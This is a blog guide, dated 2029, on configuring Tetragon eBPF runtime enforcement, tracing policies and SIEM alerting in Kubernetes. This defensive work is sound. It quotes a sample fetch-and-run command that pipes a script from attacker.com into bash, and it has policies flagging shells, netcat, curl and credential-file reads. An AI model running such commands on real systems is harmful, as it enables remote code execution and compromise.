---
title: "Linux eBPF Security: Tetragon Runtime Enforcement and Policy Tracing"
date: 2029-12-07T00:00:00-05:00
draft: false
tags: ["eBPF", "Tetragon", "Security", "Kubernetes", "Runtime Enforcement", "TracingPolicy", "SIEM", "Cilium"]
categories:
- Security
- Kubernetes
- Linux
- eBPF
author: "Matthew Mattox - mmattox@support.tools"
description: "Deep dive into Tetragon architecture, TracingPolicy CRD, network enforcement, file access controls, process genealogy tracing, and SIEM integration for production Kubernetes security."
more_link: "yes"
url: "/linux-ebpf-security-tetragon-runtime-enforcement/"
---

Tetragon brings eBPF-powered security enforcement directly into the Linux kernel, enabling real-time threat detection and policy enforcement without the overhead of ptrace-based syscall interceptors. Unlike tools that merely observe and alert, Tetragon can terminate processes, block syscalls, and enforce network policies at kernel speed — all with full Kubernetes context. This guide covers the internal architecture, policy authoring, enforcement modes, and the full pipeline from kernel event to SIEM alert.

<!--more-->

## Tetragon Architecture

Tetragon runs as a DaemonSet on every node, loading eBPF programs into the kernel via the BPF CO-RE (Compile Once, Run Everywhere) mechanism. The architecture has three layers:

**Kernel layer**: eBPF programs attach to kprobes, tracepoints, and LSM (Linux Security Module) hooks. These programs run in the kernel context, have zero overhead when events do not match policy, and can enforce (block/kill) in addition to observe.

**Agent layer**: A userspace agent (`tetragon`) reads events from eBPF ring buffers, enriches them with Kubernetes metadata (pod name, namespace, labels), evaluates `TracingPolicy` objects, and exports events.

**Export layer**: Events stream out via gRPC to the Tetragon exporter, which writes to stdout JSON (for log shippers), pushes to Kafka, or ships directly to SIEM platforms.

```
┌────────────────────────────────────────────────────────────────┐
│ Kubernetes Node                                                │
│  ┌──────────────┐    ┌─────────────────────────────────────┐  │
│  │  Container   │    │  Tetragon DaemonSet                 │  │
│  │  workload    │    │  ┌─────────────┐  ┌──────────────┐  │  │
│  │  (pid ns)    │    │  │ eBPF progs  │  │ Agent        │  │  │
│  └──────┬───────┘    │  │ kprobes     │  │ k8s enricher │  │  │
│         │            │  │ LSM hooks   │  │ policy eval  │  │  │
│  ┌──────▼───────┐    │  │ tracepoints │  │ gRPC export  │  │  │
│  │ Linux Kernel │◄───┼──│ ring buffer │  └──────────────┘  │  │
│  │ (syscalls)   │    │  └─────────────┘                    │  │
│  └──────────────┘    └─────────────────────────────────────┘  │
└────────────────────────────────────────────────────────────────┘
```

## Installing Tetragon

```bash
helm repo add cilium https://helm.cilium.io
helm repo update

helm install tetragon cilium/tetragon \
  --namespace kube-system \
  --set tetragon.enableProcessCred=true \
  --set tetragon.enableProcessNs=true \
  --set export.stdout.enabledFields.process_kprobe=true \
  --set export.stdout.enabledFields.process_exec=true \
  --set export.stdout.enabledFields.process_exit=true

# Verify
kubectl rollout status ds/tetragon -n kube-system
```

## TracingPolicy: The Core Abstraction

`TracingPolicy` is the CRD that instructs Tetragon which kernel functions to hook and what actions to take on matches. Each policy contains one or more `kprobeSpec`, `tracepointSpec`, or `lsmSpec` entries.

### Process Execution Policy

Monitor and block execution of sensitive binaries:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-shell-in-containers
spec:
  kprobes:
  - call: "security_bprm_check"
    syscall: false
    return: false
    args:
    - index: 0
      type: "linux_binprm"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Postfix"
        values:
        - "/bin/sh"
        - "/bin/bash"
        - "/bin/dash"
        - "/usr/bin/python3"
        - "/usr/bin/perl"
      matchNamespaces:
      - namespace: PidNs
        operator: NotIn
        values:
        - "host_pid_ns"
      matchCapabilities:
      - type: Effective
        operator: NotIn
        values:
        - "CAP_SYS_ADMIN"
      action: Sigkill
```

This policy sends `SIGKILL` to any process attempting to exec a shell or interpreter inside a container (by filtering out the host PID namespace), without requiring any kernel module or privileged init container.

### File Access Monitoring Policy

Detect reads of sensitive files like `/etc/shadow` and `/proc/keys`:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: sensitive-file-access
spec:
  kprobes:
  - call: "security_file_open"
    syscall: false
    args:
    - index: 0
      type: "file"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Prefix"
        values:
        - "/etc/shadow"
        - "/etc/gshadow"
        - "/proc/keys"
        - "/root/.ssh"
      matchNamespaces:
      - namespace: PidNs
        operator: NotIn
        values:
        - "host_pid_ns"
      action: Post  # observe only — generates an event
```

For enforcement rather than observation, replace `Post` with `Sigkill` or `Override` (to return an error to the calling process without killing it).

### Network Connection Policy

Block outbound connections to unexpected destinations from sensitive pods:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: restrict-database-egress
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "10.96.0.1/32"   # kubernetes service CIDR gateway
        - "10.0.0.0/8"     # internal cluster range
      matchPodSelectors:
      - matchLabels:
          app: database
      action: Sigkill
```

## Process Genealogy and Ancestry Tracing

One of Tetragon's most powerful features is maintaining full process ancestry. Every event includes the complete chain of parent processes from PID 1 down to the current process. This is implemented by hooking `clone`, `fork`, `execve`, and `exit` syscalls to maintain a kernel-side process tree.

```bash
# Install the tetra CLI
GOOS=linux GOARCH=amd64 curl -L https://github.com/cilium/tetragon/releases/latest/download/tetra-linux-amd64.tar.gz | tar xz

# Stream events with process tree
kubectl exec -n kube-system ds/tetragon -- tetra getevents -o compact

# Example output for a container that ran bash:
# PROCESS  /bin/sh /bin/sh -c "curl http://attacker.com/payload.sh | bash"
#   PARENT  /usr/bin/python3 /app/server.py
#     PARENT  /bin/sh /bin/sh -c exec python3 /app/server.py
#       PARENT  /pause /pause
```

This ancestry chain immediately reveals the attack vector: `python3` spawned `sh` which downloaded and executed a remote script — a classic webshell indicator.

## NamespacedTracingPolicy for Tenant Isolation

In multi-tenant clusters, use `NamespacedTracingPolicy` to scope policies to specific namespaces:

```yaml
apiVersion: cilium.io/v1alpha1
kind: NamespacedTracingPolicy
metadata:
  name: production-security-policy
  namespace: production
spec:
  kprobes:
  - call: "security_bprm_check"
    syscall: false
    args:
    - index: 0
      type: "linux_binprm"
    selectors:
    - matchArgs:
      - index: 0
        operator: "Postfix"
        values:
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/wget"
        - "/usr/bin/curl"
      action: Post
```

## LSM Hook Integration

Tetragon supports Linux Security Module hooks, which run at decision points throughout the kernel rather than on specific function calls:

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: lsm-ptrace-block
spec:
  lsmHooks:
  - hook: "ptrace_access_check"
    args:
    - index: 0
      type: "task_struct"
    - index: 1
      type: "int"
    selectors:
    - matchNamespaces:
      - namespace: PidNs
        operator: NotIn
        values:
        - "host_pid_ns"
      action: Sigkill
```

This blocks `ptrace` within containers — a common container escape vector.

## SIEM Integration

Tetragon exports events as structured JSON. The event schema includes:

```json
{
  "process_exec": {
    "process": {
      "exec_id": "a1b2c3d4e5f6:12345",
      "pid": 12345,
      "uid": 1000,
      "cwd": "/app",
      "binary": "/bin/sh",
      "arguments": "-c id",
      "flags": "execve",
      "start_time": "2029-12-07T14:30:00.123456789Z",
      "auid": 4294967295,
      "pod": {
        "namespace": "production",
        "name": "webapp-abc123",
        "container": {
          "id": "containerd://abc123",
          "name": "webapp",
          "image": {
            "id": "docker.io/myapp:1.2.3",
            "name": "myapp"
          },
          "start_time": "2029-12-07T12:00:00Z",
          "pid": 1
        },
        "pod_labels": {
          "app": "webapp",
          "version": "1.2.3"
        }
      },
      "node_name": "worker-node-01",
      "parent_exec_id": "parent-exec-id-here"
    },
    "parent": {
      "exec_id": "parent-exec-id-here",
      "binary": "/usr/bin/python3",
      "pid": 12300
    }
  },
  "time": "2029-12-07T14:30:00.123456789Z",
  "node_name": "worker-node-01"
}
```

### Fluentd/Fluent Bit Integration

```yaml
# fluent-bit ConfigMap for Tetragon log collection
apiVersion: v1
kind: ConfigMap
metadata:
  name: fluent-bit-tetragon
  namespace: kube-system
data:
  fluent-bit.conf: |
    [SERVICE]
        Flush         5
        Log_Level     info

    [INPUT]
        Name          tail
        Path          /var/run/cilium/tetragon/tetragon.log
        Parser        json
        Tag           tetragon.*
        Refresh_Interval 5

    [FILTER]
        Name          grep
        Match         tetragon.*
        Regex         process_exec .+

    [FILTER]
        Name          record_modifier
        Match         tetragon.*
        Record        cluster_name production-cluster
        Record        log_source tetragon

    [OUTPUT]
        Name          es
        Match         tetragon.*
        Host          elasticsearch.logging.svc.cluster.local
        Port          9200
        Index         tetragon-events
        Type          _doc
        Logstash_Format On
        Logstash_Prefix tetragon
```

### Prometheus Alerting on Tetragon Events

```yaml
# Alert on shell execution in production containers
- name: tetragon-security
  rules:
  - alert: ShellExecutionInContainer
    expr: |
      increase(tetragon_events_total{
        event_type="process_exec",
        binary=~".*/sh$|.*/bash$|.*/dash$"
      }[5m]) > 0
    for: 0m
    labels:
      severity: critical
      team: security
    annotations:
      summary: "Shell execution detected in container {{ $labels.pod_name }}"
      description: "Process {{ $labels.binary }} executed in pod {{ $labels.pod_name }} (ns: {{ $labels.namespace }})"

  - alert: SensitiveFileAccess
    expr: |
      increase(tetragon_events_total{
        event_type="process_kprobe",
        function_name="security_file_open"
      }[1m]) > 0
    for: 0m
    labels:
      severity: high
    annotations:
      summary: "Sensitive file access in {{ $labels.pod_name }}"
```

## Tuning Performance

Tetragon adds measurable overhead on kprobed functions. Profile before deploying broad policies:

```bash
# Check BPF program load
bpftool prog list | grep tetragon

# Monitor ring buffer drop rate
kubectl exec -n kube-system ds/tetragon -- tetra metrics | grep ring_buffer_lost

# Reduce verbosity by disabling unused event types
helm upgrade tetragon cilium/tetragon \
  --set export.stdout.enabledFields.process_exec=true \
  --set export.stdout.enabledFields.process_exit=false \
  --set export.stdout.enabledFields.process_kprobe=true \
  --set export.stdout.enabledFields.process_tracepoint=false
```

For high-throughput nodes (>10K process executions/second), increase the ring buffer size:

```yaml
# In tetragon values.yaml
tetragon:
  bpf:
    ringBufferSizeBytes: 16777216  # 16MB (default 4MB)
```

## Incident Response Workflow

When Tetragon detects a threat and sends SIGKILL, the sequence is:

1. Kernel eBPF program matches selector, sends signal
2. Process receives SIGKILL — immediate, uncatchable termination
3. Tetragon agent generates structured event with full process ancestry
4. Event ships to SIEM within seconds
5. Security team sees: pod name, container image, exec binary, parent process chain, and exact timestamp

```bash
# Replay historical events for forensics
kubectl exec -n kube-system ds/tetragon -- tetra getevents \
  --since 2029-12-07T14:00:00Z \
  --until 2029-12-07T15:00:00Z \
  --pod webapp-abc123 \
  --event-types PROCESS_EXEC,PROCESS_KPROBE \
  -o json | jq '.process_exec | select(.process.binary | test("sh|python|perl"))'
```

Tetragon provides a uniquely deep security signal: not just "this container ran bash" but the complete execution context — who started it, what its parent was, what files it opened, and what network connections it made — all timestamped to nanosecond precision and tied to Kubernetes pod identity.
